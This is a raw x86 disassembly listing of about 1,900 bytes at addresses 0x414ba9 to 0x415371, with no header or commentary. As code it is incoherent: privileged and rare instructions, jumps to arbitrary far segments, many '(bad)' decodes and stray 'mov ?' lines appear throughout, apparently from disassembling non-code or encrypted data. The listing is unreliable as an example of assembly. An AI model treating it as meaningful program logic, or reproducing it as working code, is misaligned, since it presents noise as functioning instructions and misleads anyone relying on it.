  414ba9:	adc    ebp,DWORD PTR [ecx]
  414bab:	fmul   QWORD PTR [eax]
  414bad:	test   al,0x7e
  414baf:	mov    BYTE PTR [ebx],dh
  414bb1:	mov    bl,0xeb
  414bb3:	fcomp  QWORD PTR [eax]
  414bb5:	jge    0x414b96
  414bb7:	sahf   
  414bb8:	call   0xb6fa:0xe7901d6d
  414bbf:	sub    BYTE PTR [ecx+0x619f1f24],al
  414bc5:	xor    DWORD PTR [eax],edx
  414bc7:	jbe    0x414c34
  414bc9:	retf   
  414bca:	lahf   
  414bcb:	dec    edi
  414bcc:	shl    DWORD PTR ds:0xcd8fec60,1
  414bd2:	jmp    0x414bd0
  414bd4:	mov    al,ds:0x5ab35f81
  414bd9:	call   0xfe68f3d3
  414bde:	mov    edi,0x9f768b4f
  414be3:	cmp    dl,cl
  414be5:	ret    0xfdb1
  414be8:	nop
  414be9:	and    DWORD PTR [ecx+ebp*2+0x5d],ecx
  414bed:	or     eax,0x8f31335e
  414bf2:	cs pop esp
  414bf4:	inc    ebx
  414bf5:	dec    ebx
  414bf6:	xchg   BYTE PTR [ecx+0x76d69aad],cl
  414bfc:	psadbw mm3,QWORD PTR [ecx-0x58]
  414c00:	stos   DWORD PTR es:[edi],eax
  414c01:	arpl   WORD PTR [eax-0x10],bx
  414c04:	pop    ds
  414c05:	fwait
  414c06:	add    BYTE PTR [esi+0x1c],bl
  414c09:	das    
  414c0a:	scas   al,BYTE PTR es:[edi]
  414c0b:	fsubp  st(4),st
  414c0d:	div    dl
  414c0f:	test   BYTE PTR [eax-0x34],cl
  414c12:	test   DWORD PTR [edi+0x634a3938],esp
  414c18:	pop    ss
  414c19:	rcl    al,cl
  414c1b:	mov    ah,0x39
  414c1d:	jne    0x414bec
  414c1f:	sbb    ebx,DWORD PTR [eax+0x1f]
  414c22:	mov    esp,0x2db361cd
  414c27:	in     al,0x67
  414c29:	push   cs
  414c2a:	and    al,BYTE PTR [esi-0x6e]
  414c2d:	inc    ebp
  414c2e:	pop    es
  414c2f:	imul   edi,esp,0x81a2ac3e
  414c35:	test   DWORD PTR [esi-0x65],ecx
  414c38:	clc    
  414c39:	mov    dh,0x13
  414c3b:	cmp    dh,BYTE PTR [edx-0x8]
  414c3e:	ret    
  414c3f:	shl    DWORD PTR [eax-0x46],cl
  414c42:	jbe    0x414be9
  414c44:	jae    0x414cc1
  414c46:	push   ebx
  414c47:	gs aas 
  414c49:	(bad)  
  414c4a:	and    edi,ecx
  414c4c:	aas    
  414c4d:	pop    es
  414c4e:	push   edi
  414c4f:	jns    0x414bed
  414c51:	gs push ds
  414c53:	xor    eax,0x9b5e2490
  414c58:	cmp    ebx,DWORD PTR [ebp+0xb4a65f4]
  414c5e:	cmc    
  414c5f:	add    eax,0xbeef8305
  414c64:	sub    dl,bl
  414c66:	and    ecx,DWORD PTR [edi+eiz*2+0x4cc0058e]
  414c6d:	push   eax
  414c6e:	inc    ecx
  414c6f:	stos   DWORD PTR es:[edi],eax
  414c70:	fidiv  DWORD PTR [edx+ecx*1-0x795081b6]
  414c77:	mov    ds:0x8a98174e,al
  414c7c:	xor    eax,0xabe8d874
  414c81:	js     0x414c80
  414c83:	out    dx,eax
  414c84:	ror    BYTE PTR [eax+esi*1],cl
  414c87:	and    BYTE PTR [eax+0x2c],bl
  414c8a:	dec    ebp
  414c8b:	push   es
  414c8c:	push   ecx
  414c8d:	daa    
  414c8e:	in     eax,0xde
  414c90:	push   ebp
  414c91:	les    ecx,FWORD PTR [ebp+edi*8-0x6c]
  414c95:	pusha  
  414c96:	ss mov ebx,0x844f23e7
  414c9c:	jg     0x414c78
  414c9e:	add    edi,DWORD PTR [edx-0x4e]
  414ca1:	push   esi
  414ca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ca3:	xchg   BYTE PTR [ecx+0x3],bh
  414ca6:	sub    eax,0x68f8c74a
  414cab:	imul   esp,ebp,0xb65fa2e0
  414cb1:	div    BYTE PTR [edi]
  414cb3:	add    dl,ch
  414cb5:	mov    ch,cl
  414cb7:	xor    ebx,ecx
  414cb9:	mov    esp,0x6389cd0c
  414cbe:	arpl   si,cx
  414cc0:	loop   0x414d2f
  414cc2:	and    DWORD PTR [edi+edi*4],ebx
  414cc5:	push   ds
  414cc6:	push   edx
  414cc7:	add    BYTE PTR [ebx*4+0x2ea505db],al
  414cce:	pop    edi
  414ccf:	aas    
  414cd0:	aam    0xc1
  414cd2:	loop   0x414cf2
  414cd4:	jmp    0x41525e
  414cd9:	mov    ah,0xb5
  414cdb:	xor    al,0xf
  414cdd:	xor    al,0x8e
  414cdf:	xor    al,0xb5
  414ce1:	or     dh,BYTE PTR [edx+0x26]
  414ce4:	je     0x414cbf
  414ce6:	shl    BYTE PTR [edx+0xcd39472],1
  414cec:	push   ss
  414ced:	cmp    eax,0x4a161604
  414cf2:	jmp    0xd3f:0x3068dc9f
  414cf9:	out    0x70,eax
  414cfb:	mov    ch,0x1f
  414cfd:	cmp    al,0x7f
  414cff:	mov    ah,dl
  414d01:	push   ecx
  414d02:	test   BYTE PTR [edx-0x14833052],cl
  414d08:	mov    WORD PTR [esi],fs
  414d0a:	sub    esp,ebp
  414d0c:	cs mov ebx,0x90253c02
  414d12:	stc    
  414d13:	test   DWORD PTR [edi+esi*1],eax
  414d16:	pop    edx
  414d17:	pop    edx
  414d18:	xchg   esp,eax
  414d19:	ja     0x414d50
  414d1b:	call   0x326fd81d
  414d20:	cmp    esp,DWORD PTR [ebx+0x20d8348e]
  414d26:	iret   
  414d27:	pop    eax
  414d28:	nop
  414d29:	imul   ecx,DWORD PTR [ebp-0x74],0xffffff86
  414d2d:	shl    DWORD PTR [esi-0x60],1
  414d30:	or     eax,0x91d3699d
  414d35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d36:	mov    bl,0x1c
  414d38:	cmp    al,BYTE PTR ds:0x94d6aec
  414d3e:	mov    cl,0x84
  414d40:	adc    ebp,DWORD PTR [edi]
  414d42:	cwde   
  414d43:	or     eax,0x8f098a62
  414d48:	and    DWORD PTR [edi],ebx
  414d4a:	inc    esp
  414d4b:	jne    0x414d2b
  414d4d:	pop    DWORD PTR [edi+0x6066cdf]
  414d53:	ins    DWORD PTR es:[edi],dx
  414d54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d55:	push   ss
  414d56:	shr    DWORD PTR [eax+0x70061292],0x6e
  414d5d:	pushf  
  414d5e:	aaa    
  414d5f:	pop    edi
  414d60:	add    al,0xd9
  414d62:	es sub ah,dh
  414d65:	stos   DWORD PTR es:[edi],eax
  414d66:	icebp  
  414d67:	or     bh,cl
  414d69:	xchg   DWORD PTR [edi],esi
  414d6b:	jle    0x414d99
  414d6d:	add    al,0x3e
  414d6f:	js     0x414d58
  414d71:	in     al,dx
  414d72:	push   0x40
  414d74:	rcl    edi,1
  414d76:	push   es
  414d77:	lds    ebx,FWORD PTR [esi+0x30ce3c1e]
  414d7d:	inc    edx
  414d7e:	jmp    0xe46d:0xee85fd07
  414d85:	ss inc esi
  414d87:	push   esi
  414d88:	fimul  DWORD PTR [edx+0x667bdbbe]
  414d8e:	cmp    ecx,ecx
  414d90:	jle    0x414d6c
  414d92:	sbb    al,0xf4
  414d94:	and    ch,BYTE PTR [ebp+eax*1+0x3570c58f]
  414d9b:	sbb    ah,BYTE PTR [eax+0x1ef4f5b]
  414da1:	adc    dl,BYTE PTR [edi-0x1c]
  414da4:	mov    edi,0xfffbc197
  414da9:	cmp    dl,cl
  414dab:	in     eax,dx
  414dac:	(bad)  
  414dad:	nop
  414dae:	push   ds
  414daf:	xor    dh,0x10
  414db2:	jmp    0x11f8:0x66b6bae6
  414db9:	mov    ebp,DWORD PTR [edx+0x76]
  414dbc:	sbb    esi,ecx
  414dbe:	pop    edx
  414dbf:	jmp    0x2e6dc21e
  414dc4:	loopne 0x414dd5
  414dc6:	test   DWORD PTR [esp+ecx*4+0x45],ecx
  414dca:	retf   
  414dcb:	and    eax,0xbb5fa06f
  414dd0:	sub    al,0x35
  414dd2:	loopne 0x414d8d
  414dd4:	xor    eax,esp
  414dd6:	mov    eax,ds:0x2df345a2
  414ddb:	mov    al,ds:0xdf159608
  414de0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  414de2:	(bad)  
  414de3:	iret   
  414de4:	mov    al,ds:0x62793355
  414de9:	hlt    
  414dea:	(bad)  
  414deb:	cmp    ebp,ebp
  414ded:	or     bh,BYTE PTR [ecx-0xb]
  414df0:	mov    ds:0x252e8838,al
  414df5:	test   DWORD PTR [esi+0x72],esi
  414df8:	jp     0x414e17
  414dfa:	retf   
  414dfb:	retf   
  414dfc:	int3   
  414dfd:	jmp    0x1f9:0xccd3d8bb
  414e04:	sub    al,0xc7
  414e06:	imul   esi,DWORD PTR [eax-0x53],0xffffffbf
  414e0a:	jl     0x414e83
  414e0c:	aad    0x53
  414e0e:	push   ebp
  414e0f:	fstp   QWORD PTR [ebp-0x7a]
  414e12:	hlt    
  414e13:	dec    esp
  414e14:	jno    0x414db4
  414e16:	(bad)  
  414e17:	pushf  
  414e18:	or     esi,DWORD PTR [ebx-0x2b]
  414e1b:	ins    BYTE PTR es:[edi],dx
  414e1c:	or     al,0xc1
  414e1e:	sbb    DWORD PTR [ecx],esp
  414e20:	fidiv  DWORD PTR [ecx+0x36]
  414e23:	popf   
  414e24:	pop    ecx
  414e25:	scas   al,BYTE PTR es:[edi]
  414e26:	(bad)  
  414e27:	mov    esp,0xbd90829c
  414e2c:	lods   al,BYTE PTR ds:[esi]
  414e2d:	aaa    
  414e2e:	jno    0x414e27
  414e30:	pop    edi
  414e31:	out    0xfd,eax
  414e33:	mov    cl,0x22
  414e35:	adc    ah,BYTE PTR [edi+0x2176a195]
  414e3b:	scas   al,BYTE PTR es:[edi]
  414e3c:	or     al,0x4b
  414e3e:	repnz outs dx,BYTE PTR ds:[esi]
  414e40:	mov    bl,0xb0
  414e42:	sub    DWORD PTR [esi+ebx*4-0x1],ecx
  414e46:	jge    0x414e18
  414e48:	es push 0xa42a8dc
  414e4e:	int3   
  414e4f:	fist   WORD PTR [edx+0x64d7044c]
  414e55:	iretw  
  414e57:	ins    BYTE PTR es:[edi],dx
  414e58:	inc    eax
  414e59:	xchg   BYTE PTR [edi+0xc12fa3],al
  414e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e60:	inc    BYTE PTR [eax-0x2d4e0fc7]
  414e66:	shl    DWORD PTR [esi+0x42e40e19],cl
  414e6c:	fadd   QWORD PTR [edx+0x58a7ff4a]
  414e72:	xchg   esi,eax
  414e73:	dec    al
  414e75:	fild   DWORD PTR [esi-0x64fbd3a6]
  414e7b:	cdq    
  414e7c:	inc    eax
  414e7d:	push   ss
  414e7e:	and    esi,ebp
  414e80:	adc    bh,BYTE PTR [eax+0x66a8028c]
  414e86:	mov    ch,0x7c
  414e88:	imul   edi,ecx,0x7c105173
  414e8e:	es pop esi
  414e90:	fsub   st(3),st
  414e92:	in     eax,dx
  414e93:	ins    DWORD PTR es:[edi],dx
  414e94:	and    DWORD PTR [ebx+0xf],esp
  414e97:	sbb    edx,DWORD PTR ds:0x900d70c4
  414e9d:	bound  esp,QWORD PTR [ebp+0xe5a3a72]
  414ea3:	lods   eax,DWORD PTR ds:[esi]
  414ea4:	nop
  414ea5:	int3   
  414ea6:	sbb    DWORD PTR [edi],ebx
  414ea8:	test   BYTE PTR [edi+esi*1],al
  414eab:	sti    
  414eac:	pop    edx
  414ead:	pop    ecx
  414eae:	gs xor eax,0xc65c692f
  414eb4:	add    edx,eax
  414eb6:	push   ss
  414eb7:	push   eax
  414eb8:	sub    dl,BYTE PTR ss:[ebx-0x2e]
  414ebc:	shr    BYTE PTR [ebp+0x3765d0f1],0x91
  414ec3:	repz dec edi
  414ec5:	pop    esi
  414ec6:	sub    DWORD PTR [ebx+0x73],ebx
  414ec9:	jns    0x414eb8
  414ecb:	dec    ebp
  414ecc:	ds (bad) 
  414ece:	mov    WORD PTR [ebp-0x5ddfe20f],cs
  414ed4:	pop    ebp
  414ed5:	push   ds
  414ed6:	mov    esp,0x1d0203
  414edb:	mov    esp,0xb1b08dd5
  414ee0:	push   es
  414ee1:	and    dl,BYTE PTR [eax]
  414ee3:	pop    esi
  414ee4:	sbb    al,0xa5
  414ee6:	ucomiss xmm2,DWORD PTR [eax+0x744f421]
  414eed:	pop    es
  414eee:	js     0x414e91
  414ef0:	xchg   ecx,eax
  414ef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ef2:	xor    eax,0x32129641
  414ef7:	rol    BYTE PTR [esi+eiz*1],cl
  414efa:	jmp    0x1a34:0x6db5a2d3
  414f01:	scas   al,BYTE PTR es:[edi]
  414f02:	mov    eax,0x6f3f152f
  414f07:	mov    BYTE PTR [esi+0x2e0c93b2],ch
  414f0d:	in     eax,dx
  414f0e:	sub    eax,0x4b14be41
  414f13:	fiadd  WORD PTR [edx+edi*8-0x402c9faf]
  414f1a:	enter  0x78a7,0x79
  414f1e:	imul   ebx,DWORD PTR [ebx-0x2ddc0fed],0x73
  414f25:	aaa    
  414f26:	mov    ah,0xff
  414f28:	pop    edi
  414f29:	lahf   
  414f2a:	test   esi,0x9867ae16
  414f30:	xor    DWORD PTR [eax],ecx
  414f32:	mov    bl,0xa5
  414f34:	adc    eax,0xdec7160d
  414f39:	lods   eax,DWORD PTR ds:[esi]
  414f3a:	loope  0x414f5c
  414f3c:	mov    ?,ebx
  414f3e:	popa   
  414f3f:	and    al,0x7c
  414f41:	mov    al,ds:0x5217e344
  414f46:	out    dx,eax
  414f47:	cld    
  414f48:	imul   esi,ecx,0x5024abc0
  414f4e:	mov    ebp,0x8b34e9b7
  414f53:	mov    ebp,0x258a22c7
  414f58:	inc    ecx
  414f59:	adc    BYTE PTR [edi],dl
  414f5b:	shl    BYTE PTR [ebx+0x5d0c88cd],1
  414f61:	mov    ds:0xd80e8599,eax
  414f66:	lock mov bh,0x64
  414f69:	add    DWORD PTR [edx],ebx
  414f6b:	sub    al,0x26
  414f6d:	rol    BYTE PTR [ecx+0x756b843],1
  414f73:	inc    ebx
  414f74:	and    al,0x43
  414f76:	push   cs
  414f77:	inc    edx
  414f78:	call   0x1ef45744
  414f7d:	push   cs
  414f7e:	loopne 0x414f9d
  414f80:	jo     0x414f4e
  414f82:	cmc    
  414f83:	(bad)  
  414f84:	xlat   BYTE PTR ds:[ebx]
  414f85:	dec    ebx
  414f86:	add    bh,BYTE PTR [esi+0x7b288e49]
  414f8c:	std    
  414f8d:	jo     0x414f6f
  414f8f:	sti    
  414f90:	mov    eax,0xd79a703f
  414f95:	jns    0x414fe0
  414f97:	pushf  
  414f98:	cld    
  414f99:	push   0x7c
  414f9b:	or     BYTE PTR [edx-0x5f25eaa1],ah
  414fa1:	stos   DWORD PTR es:[edi],eax
  414fa2:	mov    dl,0x53
  414fa4:	and    al,0x79
  414fa6:	inc    ecx
  414fa7:	mov    dh,0xa3
  414fa9:	iret   
  414faa:	add    al,0x74
  414fac:	sub    ebp,DWORD PTR [edi+0xb]
  414faf:	cdq    
  414fb0:	psrlq  mm0,QWORD PTR [ebp+ebx*2-0x1d495de]
  414fb8:	add    DWORD PTR [edx+0x4a],ebx
  414fbb:	stos   BYTE PTR es:[edi],al
  414fbc:	sti    
  414fbd:	pop    ds
  414fbe:	ds into 
  414fc0:	or     esp,DWORD PTR [ecx-0x66]
  414fc3:	sti    
  414fc4:	js     0x415001
  414fc6:	in     al,0x5f
  414fc8:	imul   eax,esi,0xffffffdf
  414fcb:	lods   al,BYTE PTR ds:[esi]
  414fcc:	mov    cl,0x78
  414fce:	dec    ebp
  414fcf:	jnp    0x414f86
  414fd1:	ret    0xf546
  414fd4:	push   edx
  414fd5:	sub    BYTE PTR [ebx],al
  414fd7:	test   al,0xc5
  414fd9:	(bad)  
  414fda:	jmp    0x4158edd6
  414fdf:	mov    eax,0x4575b0b6
  414fe4:	cmp    dl,BYTE PTR [eax+0x3f]
  414fe7:	shl    BYTE PTR [ebp+ecx*4-0x74],1
  414feb:	(bad)  
  414fec:	mov    ah,BYTE PTR [ebx+0x5a2bdc1d]
  414ff2:	add    ebp,DWORD PTR [esi+0x18]
  414ff5:	in     al,dx
  414ff6:	mov    dh,0xc4
  414ff8:	mov    bh,0x52
  414ffa:	rol    DWORD PTR [esi],1
  414ffc:	fisubr WORD PTR [ecx+0x165bd92]
  415002:	fisttp DWORD PTR [edx]
  415004:	mov    esi,DWORD PTR [esi+0x1761f264]
  41500a:	adc    al,0x6b
  41500c:	or     dl,BYTE PTR [esi-0x44]
  41500f:	fs mov fs,esp
  415012:	fsubr  st(6),st
  415014:	mov    si,0x5001
  415018:	pop    DWORD PTR [eax+0x1f]
  41501b:	xlat   BYTE PTR ds:[ebx]
  41501c:	push   ss
  41501d:	jns    0x414ffa
  41501f:	jne    0x415057
  415021:	ffree  st(2)
  415023:	sysret 
  415025:	jmp    0xaeabbf57
  41502a:	retf   0x2d4
  41502d:	shl    BYTE PTR [esi-0x70b69cd9],1
  415033:	into   
  415034:	cmp    al,0xf3
  415036:	adc    BYTE PTR ds:0x3cfb5a40,ah
  41503c:	enter  0xe880,0xb
  415040:	jbe    0x415014
  415042:	gs clc 
  415044:	jns    0x415002
  415046:	popf   
  415047:	xor    eax,0x821a9b0d
  41504c:	enter  0x4605,0x87
  415050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415051:	cmp    DWORD PTR [edi],edx
  415053:	stos   DWORD PTR es:[edi],eax
  415054:	call   0x49c1:0x27f11a14
  41505b:	iret   
  41505c:	xor    cl,BYTE PTR [eiz*1-0x2375803e]
  415063:	ret    0xe840
  415066:	scas   al,BYTE PTR es:[edi]
  415067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415068:	mov    ah,0x38
  41506a:	(bad)  
  41506b:	push   0x5145b887
  415070:	shl    esp,0x54
  415073:	pusha  
  415074:	mov    ds:0x7892cdee,al
  415079:	outs   dx,DWORD PTR ds:[esi]
  41507a:	dec    ecx
  41507b:	fsub   st(5),st
  41507d:	std    
  41507e:	jle    0x41505a
  415080:	fisttp QWORD PTR [edx+eiz*1+0x32]
  415084:	retf   0x8bbc
  415087:	push   eax
  415088:	mov    edi,0xf8fad34
  41508d:	push   ebx
  41508e:	xchg   edx,eax
  41508f:	sub    al,0x68
  415091:	test   eax,0x6ab8aee2
  415096:	fwait
  415097:	out    dx,al
  415098:	mov    BYTE PTR [ebp+esi*2-0x53be87c6],bh
  41509f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4150a1:	jnp    0x41504c
  4150a3:	or     esp,DWORD PTR [esi]
  4150a5:	out    0x73,al
  4150a7:	xchg   ebx,eax
  4150a8:	fwait
  4150a9:	adc    BYTE PTR [ebp+ebx*4-0xa],al
  4150ad:	xchg   BYTE PTR [esi-0x68],dh
  4150b0:	mov    esi,0x6517019e
  4150b5:	xlat   BYTE PTR ds:[ebx]
  4150b6:	sub    bh,0x2c
  4150b9:	and    DWORD PTR [esi-0x45c7bd7e],edi
  4150bf:	ds in  eax,0x4d
  4150c2:	mov    WORD PTR [esi+0x716cc5cb],es
  4150c8:	iret   
  4150c9:	mov    eax,0x5efd09a8
  4150ce:	pop    esi
  4150cf:	jl     0x4150b4
  4150d1:	push   eax
  4150d2:	loope  0x415086
  4150d4:	cdq    
  4150d5:	mov    edi,0x88cc837f
  4150da:	jmp    0x99f2:0x604d64f7
  4150e1:	outs   dx,DWORD PTR ds:[esi]
  4150e2:	jmp    0x4892:0x85f38245
  4150e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150eb:	inc    esp
  4150ec:	sub    eax,0x69b62586
  4150f1:	sub    DWORD PTR [edx+0x43],0xfffffff7
  4150f5:	mov    ah,0xd4
  4150f7:	xchg   ecx,eax
  4150f8:	push   es
  4150f9:	push   esp
  4150fa:	and    BYTE PTR [esi],0xdf
  4150fd:	cdq    
  4150fe:	bound  ebp,QWORD PTR [ecx-0x14]
  415101:	stos   BYTE PTR es:[edi],al
  415102:	fstp   QWORD PTR [ecx+0xd]
  415105:	mov    WORD PTR es:[edx+esi*2-0x6d],cs
  41510a:	sbb    eax,0x3a1722cc
  41510f:	mov    al,ds:0x588f70a0
  415114:	hlt    
  415115:	ret    
  415116:	pop    ss
  415117:	int    0xfb
  415119:	dec    ebx
  41511a:	push   es
  41511b:	add    DWORD PTR [eax-0x6d875739],ebp
  415121:	dec    ecx
  415122:	adc    DWORD PTR [ebx-0x57dcc446],esi
  415128:	inc    BYTE PTR [edi-0x14fd6c28]
  41512e:	add    DWORD PTR [edi],ebp
  415130:	xor    al,0xe3
  415132:	into   
  415133:	mov    bh,0x3e
  415135:	mov    ds:0x231cd4d9,al
  41513a:	mov    bh,0xc
  41513c:	mov    edi,0x14b71ea
  415141:	fmul   st(4),st
  415143:	xlat   BYTE PTR ds:[ebx]
  415144:	xchg   esp,eax
  415145:	cmp    BYTE PTR [edx-0x1],0xe8
  415149:	dec    eax
  41514a:	adc    bh,BYTE PTR [esi+0x42]
  41514d:	mov    eax,0x9724bb5f
  415152:	inc    esi
  415153:	jno    0x4151d2
  415155:	ja     0x4151ae
  415157:	mov    DWORD PTR [edi+0x38],0xe3f7e17a
  41515e:	push   cs
  41515f:	mov    WORD PTR [ecx+0x25],es
  415162:	cli    
  415163:	sti    
  415164:	data16 xor al,BYTE PTR [eax-0x4184c43]
  41516b:	mov    dl,0xb
  41516d:	iret   
  41516e:	das    
  41516f:	shr    BYTE PTR [edx-0x6a],0x0
  415173:	sbb    al,0x8a
  415175:	add    DWORD PTR [ecx+0x34],edx
  415178:	rol    DWORD PTR [ebp-0x2d975456],1
  41517e:	push   ebp
  41517f:	sbb    DWORD PTR [eax],edx
  415181:	dec    ebp
  415182:	lods   eax,DWORD PTR ds:[esi]
  415183:	je     0x415191
  415185:	out    dx,al
  415186:	mov    ebx,0x793d8508
  41518b:	cwde   
  41518c:	pushf  
  41518d:	lods   al,BYTE PTR ds:[esi]
  41518e:	sub    DWORD PTR [edx+ecx*1],edx
  415191:	test   BYTE PTR [ebp+0x789949d2],ch
  415197:	xchg   ebp,eax
  415198:	xchg   esp,eax
  415199:	mov    bh,0x32
  41519b:	in     al,0xf3
  41519d:	cmp    BYTE PTR [ecx+0x5567eba9],bl
  4151a3:	add    al,0x67
  4151a5:	pop    es
  4151a6:	sub    dh,ah
  4151a8:	test   BYTE PTR [ebx-0x1d],ah
  4151ab:	xor    DWORD PTR [eax-0x33],edi
  4151ae:	xchg   ebx,eax
  4151af:	mov    ah,0x48
  4151b1:	pop    ebp
  4151b2:	fwait
  4151b3:	lods   eax,DWORD PTR ds:[esi]
  4151b4:	cld    
  4151b5:	mov    ecx,0xdbed2c90
  4151ba:	jmp    0x415189
  4151bc:	add    eax,0x21992d6d
  4151c1:	adc    sp,sp
  4151c4:	cwde   
  4151c5:	mov    dh,0xb4
  4151c7:	test   ebp,edi
  4151c9:	test   al,0xb0
  4151cb:	sbb    BYTE PTR [esi],bh
  4151cd:	call   0xd06add40
  4151d2:	mov    ah,0x7e
  4151d4:	adc    DWORD PTR [ecx],ebx
  4151d6:	sbb    DWORD PTR [ebx+0x2a8001e5],esp
  4151dc:	das    
  4151dd:	xchg   edx,eax
  4151de:	push   ebx
  4151df:	mov    al,ah
  4151e1:	in     eax,0x86
  4151e3:	xor    bl,ch
  4151e5:	pop    eax
  4151e6:	enter  0x69dd,0x2d
  4151ea:	gs inc edi
  4151ec:	popf   
  4151ed:	sub    DWORD PTR [ecx],esp
  4151ef:	(bad)  
  4151f0:	mov    esp,0xbd23367f
  4151f5:	adc    DWORD PTR [edi],ebp
  4151f7:	mov    dh,0x7c
  4151f9:	jae    0x4151ff
  4151fb:	and    eax,0xbbc16afb
  415200:	pop    ss
  415201:	push   ds
  415202:	push   ecx
  415203:	pop    ebx
  415204:	scas   eax,DWORD PTR es:[edi]
  415205:	(bad)  
  415206:	jmp    FWORD PTR [edx+edx*8+0x9]
  41520a:	div    BYTE PTR ds:0xc218456e
  415210:	mov    es,WORD PTR [esi]
  415212:	add    esi,eax
  415214:	pusha  
  415215:	mov    ?,ebp
  415217:	fbstp  TBYTE PTR [edi-0x22e8ed4c]
  41521d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41521e:	(bad)  
  41521f:	cmp    bl,bl
  415221:	inc    ebx
  415222:	retf   
  415223:	fld    DWORD PTR [bx+si]
  415226:	or     esi,DWORD PTR [esi]
  415228:	add    eax,0x13ce8fc1
  41522d:	cmp    esp,DWORD PTR [eax-0x79]
  415230:	mov    cl,0xaf
  415232:	test   BYTE PTR [ecx],bl
  415234:	enter  0x42cd,0xda
  415238:	je     0x415262
  41523a:	sbb    DWORD PTR [edx-0x61149e10],esp
  415240:	and    eax,0x281aa624
  415245:	cmp    dl,dh
  415247:	jbe    0x41525a
  415249:	and    BYTE PTR [ebx],0x24
  41524c:	mov    cl,0xc1
  41524e:	and    BYTE PTR [ebx-0x5e13c2d8],ch
  415254:	pop    esi
  415255:	xchg   esi,eax
  415256:	and    DWORD PTR [edx+esi*8+0x5cc06463],esi
  41525d:	mov    ebp,0xb8
  415262:	shl    BYTE PTR [ebx],0xd0
  415265:	mov    DWORD PTR [ebp+0x14],edx
  415268:	mov    edx,DWORD PTR [esi]
  41526a:	mov    edi,DWORD PTR [esi+0x4]
  41526d:	xor    edi,0x9c0a89d8
  415273:	jmp    0x4157fd
  415278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415279:	(bad)  
  41527a:	outs   dx,DWORD PTR ds:[esi]
  41527b:	test   DWORD PTR [ebp+0x24],esp
  41527e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41527f:	ss das 
  415281:	sahf   
  415282:	cmp    BYTE PTR [eax+0x14],ch
  415285:	add    ebx,DWORD PTR [eax]
  415287:	test   al,0xc3
  415289:	iret   
  41528a:	or     al,0x16
  41528c:	cmp    eax,0x41161604
  415291:	add    eax,0x86171fe7
  415296:	dec    ecx
  415297:	je     0x415222
  415299:	adc    al,0x28
  41529b:	jnp    0x41528b
  41529d:	pop    edx
  41529e:	pop    eax
  41529f:	(bad)  
  4152a0:	into   
  4152a1:	adc    al,0x25
  4152a3:	jne    0x415303
  4152a5:	jb     0x415320
  4152a7:	cwde   
  4152a8:	loop   0x415261
  4152aa:	nop
  4152ab:	sub    DWORD PTR [ebx],eax
  4152ad:	adc    al,0x5d
  4152af:	add    al,0x44
  4152b1:	xchg   esp,eax
  4152b2:	(bad)  [ecx+0x3e]
  4152b5:	into   
  4152b6:	fisttp WORD PTR [edi-0x17]
  4152b9:	lock call DWORD PTR [ebx+0x13cf65b]
  4152c0:	mov    eax,0x3b3b124c
  4152c5:	into   
  4152c6:	fnstsw WORD PTR [ecx]
  4152c8:	lahf   
  4152c9:	scas   al,BYTE PTR es:[edi]
  4152ca:	rcl    DWORD PTR [ebx-0x6e],cl
  4152cd:	cmp    al,0xc4
  4152cf:	and    edx,DWORD PTR [esi+ebp*2+0x3c]
  4152d3:	fild   QWORD PTR [edx+ebp*4-0x1b]
  4152d7:	fs je  0x415316
  4152da:	in     al,dx
  4152db:	outs   dx,DWORD PTR cs:[esi]
  4152dd:	stos   BYTE PTR es:[edi],al
  4152de:	sbb    DWORD PTR [edx+esi*4-0x68538836],edx
  4152e5:	push   ds
  4152e6:	dec    eax
  4152e7:	lds    edx,FWORD PTR [ebx-0x6e145f97]
  4152ed:	push   0xffffffb0
  4152ef:	fcmovne st,st(3)
  4152f1:	out    dx,al
  4152f2:	jle    0x4152af
  4152f4:	inc    esp
  4152f5:	sub    al,0xf6
  4152f7:	hlt    
  4152f8:	lods   al,BYTE PTR ds:[esi]
  4152f9:	sbb    ebx,DWORD PTR ds:0x1f3952ff
  4152ff:	pop    ds
  415300:	imul   BYTE PTR [ecx-0x17]
  415303:	out    dx,al
  415304:	mov    dh,0x4
  415306:	es scas al,BYTE PTR es:[edi]
  415308:	inc    edi
  415309:	mov    edi,0xbe8148e9
  41530e:	and    BYTE PTR [edi+0x3271c351],0x69
  415315:	dec    edi
  415316:	inc    ebx
  415317:	lea    esp,ds:0xbeb33e21
  41531d:	sbb    DWORD PTR [edx],ebp
  41531f:	retf   
  415320:	mov    esi,0x23618f2c
  415325:	mov    ecx,0xa39efd11
  41532a:	int    0x1
  41532c:	mov    ds:0xeb8812e4,al
  415331:	hlt    
  415332:	lea    esp,[edx+eiz*8+0x3a]
  415336:	loop   0x4152d5
  415338:	pop    ebp
  415339:	pop    esi
  41533a:	lahf   
  41533b:	popf   
  41533c:	sbb    ch,BYTE PTR [eax+0x3d]
  41533f:	mov    bl,0xef
  415341:	add    BYTE PTR [ebx+0x597474e6],bh
  415347:	mov    esp,0x7f802f92
  41534c:	push   0x45
  41534e:	dec    edi
  41534f:	shl    BYTE PTR [ecx],1
  415351:	repz jne 0x41535b
  415354:	dec    ebp
  415355:	nop
  415356:	(bad)  
  415357:	aad    0x33
  415359:	xchg   ebp,eax
  41535a:	retf   
  41535b:	and    DWORD PTR [ecx+0x614275f8],ebx
  415361:	das    
  415362:	add    DWORD PTR [eax],esp
  415364:	popf   
  415365:	jmp    0x415304
  415367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415368:	ror    DWORD PTR [ecx],1
  41536a:	icebp  
  41536b:	xchg   esp,eax
  41536c:	push   eax
  41536d:	sub    ecx,DWORD PTR [ecx]
  41536f:	bound  ebp,QWORD PTR [edx]
  415371:	shl    BYTE PTR [edi],0x6
